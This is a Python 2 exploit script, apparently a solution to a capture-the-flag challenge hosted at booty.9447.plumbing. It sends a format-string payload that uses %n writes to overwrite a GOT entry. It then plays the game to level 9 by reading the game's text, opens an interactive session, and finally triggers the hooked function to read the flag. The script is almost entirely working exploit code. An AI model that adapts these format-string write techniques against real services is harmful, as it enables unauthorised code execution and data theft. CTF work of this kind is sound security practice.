__author__ = 'HuyNA'

import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

'''
ip: booty.9447.plumbing
port: 9447
'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "booty.9447.plumbing"
local_host="192.168.248.172"
port = 9447
s.connect((host, port))
#s.connect((local_host, port))

ReadFlagAddress_ = 0x080487C0
ReadFlagAddress = 0x0804A138    # got table

devil_choice = ['begins to flex their muscles.',
                'starts to tense up.',
                'is looking exhausted!']
def check_devil_choice(str_input, array_check):
    choice = -1
    for i in xrange(len(array_check)):
        if array_check[i] in str_input:
            choice = i
            break
    return choice

write_string = [5]
count = 31
write_string.append('%168u%'+str(count)+'$n')
write_string.append('%199u%'+str(count+1)+'$n')
write_string.append('%1661u%'+str(count+2)+'$n')
write_string.append('%120u%'+str(count+3)+'$n')

write_string1 = ''
for i in xrange(1,4):
    write_string1 += write_string[i]

format_string = 'xxxx'+pi(ReadFlagAddress)+pi(ReadFlagAddress+1)+pi(ReadFlagAddress+2)+pi(ReadFlagAddress+3)+'%'+'_'*3

format_string2 = format_string+'_'

option = ['r','p','h']

def send_option(s, data):
    time.sleep(1)
    s.send(data)
    print data
    return 1
def parse_data_state(data):
    # STA:  90, STR: 10 :: ddd
    a = int(data[5:8])
    return a

# send the first name
print recv_until(s,'> ')
data_sent = format_string+write_string1+'\n'
print len(data_sent)
s.send(format_string+write_string1+'\n')
time.sleep(0.1)

# run to level 9
print recv_until(s,'> ')        # always send 'p' first
s.send('p\n')
print 'p\n'

data = ''
needed_value = 0
print 'recv data'
count_level = 0
nguong = 30
while 'HAIL THE NEW PIRATE KING, ' not in data:
    data = recv_until(s,'> ')
    print data,
    data1 = data.split('\n')
    #print data1
    if 'Would ye like to play again? (y / n):' in data:
        send_option(s,'y\n')
    else:
        ii = 0
        if ':: LEVEL ' in data:
            needed_value = 0
            count_level += 1
            print count_level

            if count_level>7:
                nguong = 60
            elif count_level>5:
                nguong = 50
            elif count_level>=3:
                nguong = 60
            elif count_level>=1:
                nguong = 20
            if count_level==9:
                final_interact(s)

            ii = 6

        first_sta = data.index('STA: ')
        second_sta = data.index('STA: ',first_sta+5)

        # get my STA and STR string
        my_stat = parse_data_state(data[first_sta:])

        # get devil's STA and STR string
        devil_stat = parse_data_state(data[second_sta:])

        # get status of needed value
        status_index = data.find('-- ')
        if status_index != -1:
            end_status_index = data.find('\n', status_index)
            status = data[status_index:end_status_index]
        else:
            status = 'Khong in ra gi!'

        # next devil choice
        devil_choose = check_devil_choice(data1[len(data1)-4], devil_choice)
        #print data1[len(data1)-4]
        #print devil_choose

        if my_stat == 0:
            send_option(s,'r\n')
        elif (my_stat > 0) and (my_stat <= nguong):
            if 'Ye be lossing convincingly.' in status or 'Yarr, lose will ye!' in status or 'Ye be about to lose!' in status:
                send_option(s,'p\n')
            else:
                if devil_choose == 0:
                    send_option(s,'p\n')
                else:
                    send_option(s,'r\n')

        elif my_stat > nguong:
            send_option(s,'p\n')
        else:
            send_option(s,'p\n')

# change name => send the second name
#print recv_until(s,' be ye fearsome pirate name?\n')
s.send(format_string2+'\n')
time.sleep(0.1)
# recv flag from hooked vsprintf
print s.recv(100)